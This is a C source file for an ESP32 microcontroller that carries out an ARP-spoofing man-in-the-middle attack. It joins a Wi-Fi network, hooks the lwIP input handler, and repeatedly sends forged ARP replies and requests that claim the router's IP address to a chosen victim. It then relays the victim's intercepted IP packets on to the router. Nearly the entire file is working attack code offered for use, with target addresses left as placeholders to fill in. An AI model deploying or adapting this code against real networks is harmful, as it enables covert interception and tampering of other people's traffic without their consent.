#include <stdio.h>
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "lwip/netif.h"
#include "lwip/etharp.h"
#include "lwip/def.h"
#include "lwip/ip.h"
#include "lwip/tcp.h"
#include "lwip/prot/tcp.h"

#define DELAY(ms) vTaskDelay(pdMS_TO_TICKS(ms))

const char* TAG = "ARP-SPOOFING";
bool running;
uint8_t mac_to_spoof[6]; // MAC Router
uint8_t target_mac[6]; // MAC Victim
uint8_t ip_to_spoof[4]; // IP Router
uint8_t target_ip[4]; //MAC Victim
// To restore netif original handler
static err_t (*original_input)(struct pbuf *, struct netif *) = NULL;


wifi_config_t wifi_config_sta = {
    .sta = {
        .ssid = "",
        .password = "",
    }
};
/* Connect to a network */
void wifi_init(void){
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
}
void wifi_init_sta(void){
    esp_netif_create_default_wifi_sta();
}
void start_wifi(void){
    esp_wifi_start();
}
esp_err_t connect_to_ap(char* ssid, char* password){
    strcpy((char*)wifi_config_sta.sta.ssid, ssid);
    strcpy((char*)wifi_config_sta.sta.password, password);
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config_sta));
    return esp_wifi_connect();
}

/* ARP Spoofing*/
void send_arp(struct netif *netif, int type) {
    struct pbuf *p;
    struct etharp_hdr *arp_reply;
    p = pbuf_alloc(PBUF_RAW, sizeof(struct etharp_hdr) + SIZEOF_ETH_HDR, PBUF_RAM);
    if (!p) {
        ESP_LOGE(TAG, "Error assigning pbuf");
        return;
    }
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    arp_reply = (struct etharp_hdr *)(ethhdr + 1);
    const uint8_t *esp_mac = netif->hwaddr;
    uint8_t esp_ip[4];
    memcpy(esp_ip, ip_to_spoof, sizeof(ip_to_spoof));

    // Ethernet header
    MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN); 
    MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
    ethhdr->type = PP_HTONS(ETHTYPE_ARP);

    // ARP message
    arp_reply->hwtype = PP_HTONS(1);
    arp_reply->proto = PP_HTONS(ETHTYPE_IP);
    arp_reply->hwlen = ETH_HWADDR_LEN;
    arp_reply->protolen = sizeof(ip4_addr_t);
    if (type == 0){
        arp_reply->opcode = PP_HTONS(ARP_REPLY);
    }else if (type == 1){
        arp_reply->opcode = PP_HTONS(ARP_REQUEST);
    }
    
    // MAC
    MEMCPY(arp_reply->shwaddr.addr, esp_mac, ETH_HWADDR_LEN); //MAC ESP
    MEMCPY(arp_reply->dhwaddr.addr, target_mac, ETH_HWADDR_LEN); //MAC victim
    
    // IP
    MEMCPY(&arp_reply->sipaddr, esp_ip, sizeof(ip4_addr_t)); //Source: spoofed ip
    MEMCPY(&arp_reply->dipaddr, target_ip, sizeof(ip4_addr_t)); //Dest: IP victim

    // Send ARP
    err_t err = netif->linkoutput(netif, p);
    if (err != ERR_OK) {
        ESP_LOGE(TAG, "Error sending ARP Rep/req: %d", err);
    } 

    pbuf_free(p);
}
void route_packet(struct pbuf *p, struct netif *netif){
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    const uint8_t *esp_mac = netif->hwaddr;
    // Change source and destination
    MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
    MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN);
    // Send
    err_t err = netif->linkoutput(netif, p);
    if (err != ERR_OK) {
        ESP_LOGE(TAG, "Error routing: %d", err);
    } 
}

err_t my_ethernet_input(struct pbuf *p, struct netif *netif) { // Para tratar paquetes recibidos
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    if (ethhdr->type == PP_HTONS(ETHTYPE_ARP)) {
        struct etharp_hdr *arphdr = (struct etharp_hdr *)((u8_t *)ethhdr + SIZEOF_ETH_HDR);
        if (arphdr->opcode == PP_HTONS(ARP_REQUEST)) {
            ESP_LOGI(TAG, "ARP Request from: %x:%x:%x:%x:%x:%x", arphdr->shwaddr.addr[0], arphdr->shwaddr.addr[1], arphdr->shwaddr.addr[2], 
                arphdr->shwaddr.addr[3], arphdr->shwaddr.addr[4], arphdr->shwaddr.addr[5]);
        
            if ((uint8_t)arphdr->sipaddr.addrw[0] == ip_to_spoof[0] && 
                (uint8_t)(arphdr->sipaddr.addrw[0] >> 8) == ip_to_spoof[1] &&
                (uint8_t)arphdr->sipaddr.addrw[1] == ip_to_spoof[2] &&
                (uint8_t)(arphdr->sipaddr.addrw[1] >> 8) == ip_to_spoof[3]){

                mac_to_spoof[0] = arphdr->shwaddr.addr[0];
                mac_to_spoof[1] = arphdr->shwaddr.addr[1];
                mac_to_spoof[2] = arphdr->shwaddr.addr[2];
                mac_to_spoof[3] = arphdr->shwaddr.addr[3];
                mac_to_spoof[4] = arphdr->shwaddr.addr[4];
                mac_to_spoof[5] = arphdr->shwaddr.addr[5];
                //printf("Mactospoof: %x:%x:%x:%x:%x:%x", mac_to_spoof[0], mac_to_spoof[1], mac_to_spoof[2], mac_to_spoof[3], mac_to_spoof[4], mac_to_spoof[5]);
            }
            if (memcmp(arphdr->shwaddr.addr, target_mac, 6) == 0){//(arphdr->shwaddr.addr[0] == target_mac[0]){ // Si proviene de la victima
                ESP_LOGI(TAG, "SENT ARP REPLY");
                send_arp(netif, 0);
            }
            if (memcmp(arphdr->shwaddr.addr, mac_to_spoof, 6) == 0){//(arphdr->shwaddr.addr[0] == mac_to_spoof[0]){ // Si proviene del AP enviamos request
                ESP_LOGI(TAG, "SENT ARP REQUEST");
                send_arp(netif, 1);
            }
        }
    }
    else if (ethhdr->type == PP_HTONS(ETHTYPE_IP)) {
        struct ip_hdr *iphdr = (struct ip_hdr *)(p->payload + SIZEOF_ETH_HDR);
        //extract_info(p);
        route_packet(p, netif);
    }
    return netif_input(p, netif); // Leave packet to lwIP
}

void parse_ip(const char *ip_str, uint8_t ip[4]) {
    int temp[4];
    if (sscanf(ip_str, "%d.%d.%d.%d", &temp[0], &temp[1], &temp[2], &temp[3]) == 4) {
        for (int i = 0; i < 4; i++) {
            ip[i] = (uint8_t)temp[i];
        }
    } else {
        ESP_LOGE(TAG, "Invalid IP format");
    }
}
void parse_mac(const char* mac_str, uint8_t mac[6]) {
    int temp[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &temp[0], &temp[1], &temp[2], &temp[3], &temp[4], &temp[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (uint8_t)temp[i];
        }
    } else {
        ESP_LOGE(TAG, "Invalid MAC format");
    }
}
void arp_spoof(char* target, char* to_spoof, char* target_mac_string){
    struct netif *netif = netif_default;
    if (original_input == NULL) { //Guardamos el input original
        original_input = netif->input;
    }
    netif->input = my_ethernet_input;
    parse_ip(target, target_ip);
    parse_ip(to_spoof, ip_to_spoof);
    //printf("%u.%u.%u.%u\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    //printf("%u.%u.%u.%u\n", ip_to_spoof[0], ip_to_spoof[1], ip_to_spoof[2], ip_to_spoof[3]);
    uint8_t tmp_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //Change accordingly
    memcpy(mac_to_spoof, tmp_mac, 6);
    parse_mac(target_mac_string, target_mac);
    /*printf("MAC correctly parsed: %02x:%02x:%02x:%02x:%02x:%02x\n",
                target_mac[0], target_mac[1], target_mac[2],
                target_mac[3], target_mac[4], target_mac[5]);*/
    send_arp(netif, 0);
    running = true;
    while (running){
        send_arp(netif, 1);
        ESP_LOGI(TAG, "Sent request");
        DELAY(5000);
    }
    // Restore state
    if (original_input != NULL) {
        netif->input = original_input;
        original_input = NULL; 
    }
}
void app_main(void)
{
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      ESP_ERROR_CHECK(nvs_flash_erase());
      ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    wifi_init();
    wifi_init_sta();
    start_wifi();
    connect_to_ap("", "");
    DELAY(2000);
    // Change accordingly
    arp_spoof("192.168.x.x", "192.168.1.1", "xx:xx:xx:xx:xx:xx");
}